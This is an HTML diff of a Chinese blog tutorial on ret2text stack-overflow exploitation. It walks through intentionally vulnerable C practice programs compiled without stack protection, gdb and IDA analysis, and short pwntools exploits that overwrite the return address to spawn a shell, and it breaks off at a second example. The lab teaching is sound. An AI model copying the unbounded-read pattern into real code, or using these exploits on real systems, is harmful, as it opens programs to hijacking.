@@ -1,0 +1,969 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN-基础-ret系列 | iyheart的博客</title><meta name="author" content="iyheart"><meta name="copyright" content="iyheart"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：进入正轨">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN-基础-ret系列">
+<meta property="og:url" content="http://iyheart.github.io/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="iyheart的博客">
+<meta property="og:description" content="前言：进入正轨">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover13.jpg">
+<meta property="article:published_time" content="2024-03-22T04:12:55.000Z">
+<meta property="article:modified_time" content="2024-05-17T12:48:40.872Z">
+<meta property="article:author" content="iyheart">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover13.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://iyheart.github.io/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN-基础-ret系列',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-17 20:48:40'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover13.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="iyheart的博客"><img class="site-icon" src="http://img95.699pic.com/photo/40151/9175.gif_wh860.gif"/><span class="site-name">iyheart的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN-基础-ret系列</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-22T04:12:55.000Z" title="发表于 2024-03-22 12:12:55">2024-03-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-17T12:48:40.872Z" title="更新于 2024-05-17 20:48:40">2024-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN-基础-ret系列"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>前面的示例程序中，在main函数都会存在shellcode。</li>
+<li>接下来看在main函数中不存在shellcode的情况，而main函数以外的，自定义的函数却存在shellcode</li>
+</ul>
+<h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1>
+<ul>
+<li>
+<p>CPU可以读内存也可以读取寄存器，主要还是读取寄存器</p>
+</li>
+<li>
+<p>有一种计算机体系结构，没有内存，CPU直接去读硬盘。但是硬盘的读取速度太慢，而CPU处理的速度很快。这就会影响效率。</p>
+</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323141742965.png" alt="image-20240323141742965"></p>
+<ul>
+<li>此后就出现了内存，而目前我们要考虑的是CPU读取内存</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323142018592.png" alt="image-20240323142018592"></p>
+<ul>
+<li>在计算机发展的过程中，内存与CPU直接又出现了缓存、保护模式、虚拟内存</li>
+</ul>
+<h2 id="内存虚拟地址空间"><a class="markdownIt-Anchor" href="#内存虚拟地址空间"></a> 内存虚拟地址空间</h2>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323143119852.png" alt="image-20240323143119852"></p>
+<h2 id="偏移"><a class="markdownIt-Anchor" href="#偏移"></a> 偏移</h2>
+<h2 id="栈"><a class="markdownIt-Anchor" href="#栈"></a> 栈</h2>
+<h2 id="堆"><a class="markdownIt-Anchor" href="#堆"></a> 堆</h2>
+<h2 id="函数传参"><a class="markdownIt-Anchor" href="#函数传参"></a> 函数传参</h2>
+<h2 id="ret系列思路"><a class="markdownIt-Anchor" href="#ret系列思路"></a> ret系列思路</h2>
+<ul>
+<li>rip地址控制的是CPU要执行的指令，调用完函数是需要ret指令将地址返回到main函数里面去的。</li>
+<li>此时我们通过栈溢出，修改压入栈中的返回地址，将返回地址修改成我们的后门函数。那么rip就会执向后门函数的执行程序。</li>
+<li>这样就可以使得，在main函数中没有调用的后门函数得以执行，获取控制权，拿到flag</li>
+</ul>
+<h1 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text"></a> ret2text</h1>
+<h2 id="例题1"><a class="markdownIt-Anchor" href="#例题1"></a> 例题1</h2>
+<ul>
+<li>
+<p>ret指定函数，不带形参</p>
+</li>
+<li>
+<p>示例程序（x86，而不是x64）</p>
+</li>
+<li>
+<p>gcc编译指令<code>gcc question_4_1.c -m32 -fno-stack-protector -o question_4_1_x86</code></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">char sh[]=&quot;/bin/sh&quot;;</span><br><span class="line"></span><br><span class="line">int func(char *cmd)&#123;</span><br><span class="line">        system(sh);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int dofunc()&#123;</span><br><span class="line">    char b[8] = &#123;&#125;;</span><br><span class="line">        puts(&quot;input:&quot;);</span><br><span class="line">        read(0,b,0x100);</span><br><span class="line">        //printf(b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="查看程序"><a class="markdownIt-Anchor" href="#查看程序"></a> 查看程序</h3>
+<ul>
+<li>查看保护</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323162746290.png" alt="image-20240323162746290"></p>
+<ul>
+<li>查看文件类型
+<ul>
+<li>ELF：32-bit    32位的文件</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323162504230.png" alt="image-20240323162504230"></p>
+<h3 id="运行程序"><a class="markdownIt-Anchor" href="#运行程序"></a> 运行程序</h3>
+<ul>
+<li>发现有一个输入点，没有输出点</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323162257407.png" alt="image-20240323162257407"></p>
+<h3 id="拖入ida"><a class="markdownIt-Anchor" href="#拖入ida"></a> 拖入IDA</h3>
+<ul>
+<li>第一步查看到文件是32位的文件，应该拖入32位的ida文件去反汇编</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323162948858.png" alt="image-20240323162948858"></p>
+<ul>
+<li>F5反编译，再查看函数，最后发现在main函数中没有执行后门函数</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323163015171.png" alt="image-20240323163015171"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323163034157.png" alt="image-20240323163034157"></p>
+<ul>
+<li>SHIFT+F12，发现字符串里面有一个bin/sh</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323163131240.png" alt="image-20240323163131240"></p>
+<ul>
+<li>找到调用/bin/sh的函数</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323164152998.png" alt="image-20240323164152998"></p>
+<h3 id="使用gdb动调"><a class="markdownIt-Anchor" href="#使用gdb动调"></a> 使用gdb动调</h3>
+<ul>
+<li>开始运行程序</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323164351572.png" alt="image-20240323164351572"></p>
+<ul>
+<li>si步入进dofunc()函数</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323164636153.png" alt="image-20240323164636153"></p>
+<ul>
+<li>在调试中发现，输入点的输入的数据，存储在main函数地址的上方，这个时候就可以进行操作了</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323164955072.png" alt="image-20240323164955072"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323165140577.png" alt="image-20240323165140577"></p>
+<ul>
+<li>在ida中可以看出，main函数的起始地址在整个程序段中的相对地址，和func在整个程序段中的相对地址，然后再看gdb动调的实际地址，得到起始地址(这里gdb也有一个指令<code> p &amp;func</code>，可以看到func函数的地址)</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323165413095.png" alt="image-20240323165413095"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323165756455.png" alt="image-20240323165756455"></p>
+<ul>
+<li>这时再计算func()函数的绝对地址</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323170045073.png" alt="image-20240323170045073"></p>
+<ul>
+<li>gdb动调看看要输入多少个字符才能到返回地址所在的栈，这里也可以静态调试，用ida查看栈（这里ida更方便）</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323170843441.png" alt="image-20240323170843441"></p>
+<ul>
+<li>发现存储main函数的地址的栈，经过计算要填充0x14个a才能栈溢出到该栈。</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323170932378.png" alt="image-20240323170932378"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323170229603.png" alt="image-20240323170229603"></p>
+<ul>
+<li>尝试栈溢出，发现正常输入可能解决不了，直接用set修改执行地址看看</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323171816693.png" alt="image-20240323171816693"></p>
+<ul>
+<li>通过修改栈中的值就可以使得ret指令返回的不是main函数，而是func函数</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323172810201.png" alt="image-20240323172810201"></p>
+<h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./question_4_1_x86&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x565561c0</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="作业1"><a class="markdownIt-Anchor" href="#作业1"></a> 作业1</h2>
+<ul>
+<li>
+<p>例题1的进阶版</p>
+</li>
+<li>
+<p>编译指令<code> gcc question_4_1.c -m32 -fno-stack-protector -no-pie -fomit-frame-pointer -o question_4_1_x86_sep</code></p>
+</li>
+<li>
+<p>指令意思:</p>
+<ul>
+<li><code> -m32</code>以32位模式编译，</li>
+<li><code>-fno-stack-protector</code>不要为局部变量启用堆栈保护，</li>
+<li><code> -no-pie</code>不要生成位置无关可执行文件,会禁用PIE的生成，从而生成传统的固定地址可执行文件，</li>
+<li><code>-formit-frame-pointer</code>用于控制是否在生成的代码中包含帧指针，<strong>启用该指令就不是ebp寻址了，而是esp寻址</strong></li>
+</ul>
+</li>
+<li>
+<p>代码</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">        system(sh);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">        <span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="对比"><a class="markdownIt-Anchor" href="#对比"></a> 对比</h3>
+<ul>
+<li>为了更直观的能感受到作业1和例题1的区别，故使用gdb动调对这俩个程序进行对比</li>
+<li>用三个不同点</li>
+</ul>
+<ol>
+<li>寻址方式不同，question_4_1_x86中都是用ebp进行寻址的</li>
+</ol>
+<p><code>question_4_1_x86</code>中</p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240327192842682.png" alt="image-20240327192842682"></p>
+<p>而<code>question_4_1_x86_sep</code></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240327193115891.png" alt="image-20240327193115891"></p>
+<ol start="2">
+<li>返回main函数的地址存储所在的栈不同</li>
+</ol>
+<p><code>question_4_1_x86</code></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240327193418946.png" alt="image-20240327193418946"></p>
+<p>而在<code>question_4_1_x86_sep</code>中main函数的返回地址就会在ebp的所指向栈的上面，而不是在ebp所指向栈的下面一个栈。</p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240327193629380.png" alt="image-20240327193629380"></p>
+<ol start="3">
+<li>静态调试的栈</li>
+</ol>
+<p><code> question_4_1_x86</code></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240327194524754.png" alt="image-20240327194524754"></p>
+<p>而<code>question_4_1_x86_sep</code> 中<strong>没有s，直接到r</strong></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240327194004253.png" alt="image-20240327194004253"></p>
+<h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./question_4_1_x86_sep&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08049196</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="作业2"><a class="markdownIt-Anchor" href="#作业2"></a> 作业2</h2>
+<ul>
+<li>将b数组的长度由原来的8，该为23</li>
+<li>由于一个栈存储16位数据，那么23是个质数，就会出现该数组存入栈中，但是</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">        system(sh);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">23</span>] = &#123;&#125;;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">        <span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="例题2"><a class="markdownIt-Anchor" href="#例题2"></a> 例题2</h2>
+<ul>
+<li>
